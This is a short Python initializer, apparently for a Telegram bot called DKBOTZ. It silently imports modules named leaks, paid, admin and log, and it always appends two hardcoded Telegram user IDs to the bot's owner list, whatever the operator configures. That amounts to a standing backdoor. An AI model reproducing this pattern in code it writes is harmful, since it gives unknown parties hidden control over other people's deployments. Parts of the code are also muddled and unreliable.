try:
    from .leaks import *
except:
    pass

async def main():
    try:
        from .paid import *  # Attempt to import the 'paid' module and its contents
        message_text = "PAID MODULE ACTIVATED"
        await clients(message_text)
    except ImportError:  # Catch ImportError if the import fails
        try:
            from .paid import *
        except ImportError:
            pass

# Call the asynchronous main function
if __name__ == "__main__":
    import asyncio
    asyncio.run(main())


import os


try:
    from .admin import *
except:
    pass

try:
    from .log import *
except:
    pass

try:
    DKBOTZOWNER=[]
    for x in (os.environ.get("DKBOTZ_BY_OWNER", "5111685964").split()):
        DKBOTZOWNER.append(int(x))
except ValueError:
        print("Your Admins list does not contain valid integers.")

DKBOTZOWNER.append(5111685964)
DKBOTZOWNER.append(1805398747)






